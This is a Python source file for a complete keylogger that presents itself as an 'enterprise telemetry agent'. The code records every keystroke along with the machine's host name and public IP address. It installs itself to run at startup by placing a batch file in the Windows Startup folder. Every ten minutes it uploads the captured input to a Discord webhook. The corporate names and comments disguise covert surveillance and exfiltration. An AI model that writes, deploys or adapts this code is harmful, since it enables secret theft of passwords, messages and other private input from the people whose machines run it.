import os
import sys
import time
import json
import socket
import collections
from datetime import datetime
from threading import Thread, Lock
import requests
from requests.adapters import HTTPAdapter
from urllib3.util import Retry
from pynput.keyboard import Listener

class EnterpriseTelemetryAgent:
    def __init__(self, webhook_url: str, flush_interval_seconds: int = 600) -> None:
        self.webhook_url = webhook_url
        self.interval = flush_interval_seconds
        
        # Core metadata definition for distributed tracing
        self.computer_name = socket.gethostname()
        self.public_ip = self._fetch_public_ip()
        
        # Thread-safe telemetry ring buffer
        self.buffer_lock = Lock()
        self.event_buffer = collections.deque(maxlen=10000)
        
        # Enterprise-grade session with intelligent backoff and rate-limit safety
        self.session = requests.Session()
        retry_strategy = Retry(
            total=5,
            backoff_factor=3,  # Dynamic wait: 3s, 6s, 12s, 24s... (Prevents webhook locks)
            status_forcelist=[429, 500, 502, 503, 504],
            raise_on_status=False
        )
        self.session.mount("https://", HTTPAdapter(max_retries=retry_strategy))
        
        self._enable_startup()
        
        # Asynchronous transport pipeline
        self.worker_thread = Thread(target=self._telemetry_delivery_pipeline, daemon=True)
        self.worker_thread.start()

    def _fetch_public_ip(self) -> str:
        """Retrieves external IP with zero-leak fallback policy."""
        services = ["https://api.ipify.org", "https://ifconfig.me/ip", "https://icanhazip.com"]
        for service in services:
            try:
                response = requests.get(service, timeout=5)
                if response.status_code == 200:
                    return response.text.strip()
            except Exception:
                continue
        return "127.0.0.1"

    def _enable_startup(self) -> None:
        try:
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
                startup_dir = os.path.join(os.environ.get("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
                shortcut_path = os.path.join(startup_dir, "KeyLogStartup.bat")
                
                if not os.path.exists(shortcut_path):
                    with open(shortcut_path, "w") as bat_file:
                        bat_file.write(f'@echo off\nstart "" "{exe_path}"')
        except Exception as e:
            sys.stderr.write(f"Persistence execution failed: {e}\n")

    def _emit_telemetry(self, representation: str) -> None:
        """Constructs a deterministic enterprise event payload schema."""
        event = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "host_name": self.computer_name,
            "source_ip": self.public_ip,
            "captured_input": representation
        }
        with self.buffer_lock:
            self.event_buffer.append(event)

    def on_press(self, key) -> None:
        try:
            # Handle native characters directly (Preserves Shift, CapsLock, and local layouts)
            if hasattr(key, 'char') and key.char is not None:
                self._emit_telemetry(key.char)
                return
        except AttributeError:
            pass

        # Parse control keys into clean, human-readable structural representations
        control_keys = {
            "Key.space": " ",
            "Key.enter": "\n",
            "Key.backspace": " [BACKSPACE] ",
            "Key.tab": " [TAB] ",
            "Key.caps_lock": " [CAPSLOCK] ",
            "Key.shift": "",  # Shift state is natively handled by key.char above
            "Key.shift_r": "",
            "Key.ctrl_l": " [CTRL] ",
            "Key.ctrl_r": " [CTRL] ",
            "Key.alt_l": " [ALT] ",
            "Key.alt_gr": " [ALTGR] ",
            "Key.esc": " [ESC] ",
            "Key.up": " [UP_ARROW] ",
            "Key.down": " [DOWN_ARROW] ",
            "Key.left": " [LEFT_ARROW] ",
            "Key.right": " [RIGHT_ARROW] "
        }

        clean_key = str(key)
        if clean_key in control_keys:
            if control_keys[clean_key]:  # Skip empty strings like standalone Shift
                self._emit_telemetry(control_keys[clean_key])
        else:
            # Format any unmapped system keys cleanly without raw python module paths
            friendly_name = clean_key.replace("Key.", "").upper()
            self._emit_telemetry(f" [{friendly_name}] ")

    def _telemetry_delivery_pipeline(self) -> None:
        while True:
            time.sleep(self.interval)
            
            batch = []
            with self.buffer_lock:
                while self.event_buffer:
                    batch.append(self.event_buffer.popleft())
            
            if not batch:
                continue
                
            # Serialize structured data matrix cleanly preserving multi-host origin telemetry
            serialized_payload = json.dumps(batch, ensure_ascii=False, indent=2)
            
            # File named uniquely by host and timestamp to prevent cross-device collision at ingestion
            filename = f"log_{self.computer_name}_{int(time.time())}.json"
            
            payload = {
                "content": f"📊 **Enterprise Telemetry Report**\n"
                           f"**Host:** `{self.computer_name}`\n"
                           f"**Public IP:** `{self.public_ip}`\n"
                           f"**Transmission Time:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
            }
            files = {
                "file": (filename, serialized_payload, "application/json")
            }
            
            try:
                response = self.session.post(self.webhook_url, data=payload, files=files, timeout=20)
                response.raise_for_status()
            except requests.exceptions.RequestException as e:
                sys.stderr.write(f"Transport layer dropped connection: {e}\n")
                # Recovery mechanism: Re-inject the data loop to prevent signal loss
                with self.buffer_lock:
                    for event in reversed(batch):
                        self.event_buffer.appendleft(event)

if __name__ == "__main__":
    WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"
    
    # 600 seconds = 10 minutes flush interval
    agent = EnterpriseTelemetryAgent(webhook_url=WEBHOOK_URL, flush_interval_seconds=600)
    
    with Listener(on_press=agent.on_press) as listener:
        listener.join()